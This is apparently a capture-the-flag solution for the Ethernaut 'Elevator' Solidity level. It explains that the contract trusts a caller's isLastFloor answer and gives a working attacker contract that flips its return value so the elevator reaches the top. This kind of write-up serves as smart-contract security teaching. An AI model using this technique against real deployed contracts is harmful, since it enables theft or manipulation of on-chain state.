[11 - Elevator](https://ethernaut.openzeppelin.com/level/0x4A151908Da311601D967a6fB9f8cFa5A3E88a251)

Solution: 
* the contract will call the isLastFloor function on any msg.sender Building address
* we can create a Building contract that first returns false, and then true, for isLastFloor, irrespective of floor
* deploy with Remix and call solve
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Building {
  bool private isLastFloorBool = true;
  Elevator private constant elevatorContract = Elevator(0xf23298C44CA2d4659Bb3064FbC42D4aBC634Bc69);

  function solve() external {
    elevatorContract.goTo(0);
  }

  function isLastFloor(uint) external returns (bool) {
    isLastFloorBool = !isLastFloorBool;
    return isLastFloorBool;
  }

} 

contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}
```